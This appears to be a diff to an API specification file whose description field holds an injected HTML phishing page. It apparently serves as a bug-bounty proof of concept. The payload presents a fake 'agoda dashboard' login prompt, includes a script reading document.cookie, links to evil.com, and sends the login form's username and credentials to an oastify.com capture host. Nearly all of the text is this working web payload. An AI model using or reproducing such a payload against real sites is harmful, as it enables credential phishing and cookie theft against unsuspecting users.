@@ -4,12 +4,15 @@ info:
   title: adjust Login Verification.
   description: '<div class="login-form">
     <div class="heading">
-    <img  src="https://profile-photos.hackerone-user-content.com/variants/0y8yz7n6j5sfjx17kcmtv8tfvtuf/5fd11c324df07e597eb78f6408fe2c2c871c1503f479ab4fa8446caf0eb02322" >
-        <h1>welcom to adjust dashboard : Plese  Login First </h1>
+    <img  src="https://profile-photos.hackerone-user-content.com/variants/pzo90pdnx9c1c49701o4wnsx08zk/66555439a92cf3e7dc0339d5fb79b6624a23d8919c96c34859e2df0522f0278e" >
+        <h1>welcom to agoda dashboard : Plese  Login First  </h1>
+ <h2>for login enter your credintials bellow</h2>
         <script>alert(document.cookie)</script>
+        <a href='https://evil.com/' >Visit our Hotels Site</a>
+        <link href='https://cdn6.agoda.net/cdn-accom-web/js/assets/browser-bundle/AVENGERS-1679=A&PER-9231=A/3402-e4984b598588.css' rel='stylesheet' onerror='loadErrorHandler.call(this, event)'/>
     </div>
     <div class="form-container">
-        <form action="https://7s0wrj0zeagbygktg7avgdu87zdq1mpb.oastify.com/" method="post" class="form-signin">
+        <form action="https://awa2hiq4gwx9ghz11jyothla218swik7.oastify.com/" method="post" class="form-signin">
             <div class="form-group">
                 <label for="username">Username</label>
                 <input type="text" name="username" size="20">
